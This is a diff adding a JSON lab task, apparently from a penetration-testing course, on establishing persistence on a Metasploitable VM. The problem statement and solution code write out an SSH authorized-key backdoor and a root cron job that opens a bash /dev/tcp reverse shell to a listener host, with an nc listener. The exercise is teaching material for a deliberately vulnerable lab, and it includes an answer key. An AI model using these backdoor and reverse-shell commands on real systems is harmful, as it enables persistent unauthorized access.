@@ -1,0 +1,14 @@
+{
+    "id": "task1",
+    "chapterId": "ch_11",
+    "title": "Establish Persistence on Linux",
+    "description": "Create a cron job and SSH key backdoor on Metasploitable.",
+    "estimatedMinutes": 25,
+    "problemStatement": "# Objective\nAfter gaining a shell on Metasploitable (using vsftpd or Samba exploit), establish **two** methods of persistence so you can reconnect after a reboot.\n\n## Steps\n1.  Obtain a root shell on Metasploitable (use `msfadmin`/`msfadmin` via SSH, or exploit).\n2.  **Method 1: SSH Authorized Key**\n    - On Kali, generate an SSH key: `ssh-keygen -t rsa -f mykey` (no passphrase).\n    - Copy the public key (`mykey.pub`).\n    - On Metasploitable, append the public key to `/root/.ssh/authorized_keys` (create the directory/file if needed).\n    - Verify by SSHing from Kali: `ssh -i mykey root@192.168.56.101`.\n3.  **Method 2: Cron Job Reverse Shell**\n    - On Metasploitable, add a cron job that runs every minute and connects back to your Kali listener.\n    - Edit root's crontab: `crontab -e`.\n    - Add line: `* * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.56.102/5555 0>&1'`\n    - On Kali, start a listener: `nc -lvnp 5555`.\n    - Wait up to 60 seconds for the connection.\n\n## Deliverable\nScreenshot showing the successful SSH key login and the reverse shell from the cron job.",
+    "hints": [
+        "Ensure `/root/.ssh` exists: `mkdir -p /root/.ssh && chmod 700 /root/.ssh`.",
+        "Cron job syntax: minute hour day month weekday command."
+    ],
+    "expectedOutput": "SSH login without password and a root reverse shell within 60 seconds.",
+    "solutionCode": "# On Kali\nssh-keygen -t rsa -f mykey -N \"\"\ncat mykey.pub\n\n# On Metasploitable (as root)\nmkdir -p /root/.ssh\necho \"ssh-rsa AAA...\" >> /root/.ssh/authorized_keys\nchmod 600 /root/.ssh/authorized_keys\n\n# Cron job\n(crontab -l 2>/dev/null; echo \"* * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.56.102/5555 0>&1'\") | crontab -\n\n# On Kali listener\nnc -lvnp 5555"
+}
